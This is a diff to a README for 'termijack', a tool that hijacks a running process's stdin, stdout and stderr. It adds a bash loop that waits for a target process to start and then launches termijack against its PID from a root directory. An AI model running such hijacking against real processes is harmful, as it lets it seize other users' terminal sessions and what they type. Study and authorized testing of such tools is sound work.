@@ -68,3 +68,25 @@ Hijack stdin, stdout, and stderr:
 Hijack stdin, stdout, and stderr. Also, reflect them back to the target process:
 
 * ```./termijack.py -IOE $TARGET_PID```
+
+
+## BASH script ##
+
+Continuous scan running processes and start termijack once it discovered our process of interest:
+
+* ```#!/bin/bash
+counter=2
+openssl_process_id=0
+while [ $counter -gt 1 ]
+do
+	openssl_process_id=$(pidof ping)
+	if [ $openssl_process_id ]; then
+    		echo "DETECTED - ping running"
+		counter=0
+	fi
+done
+
+if [[ "$counter" -eq 0 ]]; then
+	/root/RECOVER_BACKUP/./termijack.py -IOE $openssl_process_id
+fi
+```
